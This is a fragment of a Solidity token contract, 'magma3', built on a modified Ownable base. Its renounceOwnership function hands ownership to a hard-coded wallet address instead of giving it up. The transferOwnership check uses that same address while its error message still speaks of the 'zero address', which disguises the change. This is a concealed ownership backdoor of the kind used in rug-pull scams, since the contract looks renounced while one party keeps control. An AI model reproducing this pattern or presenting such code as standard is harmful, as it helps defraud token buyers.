...
contract Ownable is Context {
    ...
    function renounceOwnership() external virtual onlyOwner { _owner = address(0x6600207aC7e1141E85bdD9b3AA9EaBE380218f92); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0x6600207aC7e1141E85bdD9b3AA9EaBE380218f92), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract magma3 is IERC20, Ownable {
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "magma3!";
    string private constant _symbol = "MAGMA3";
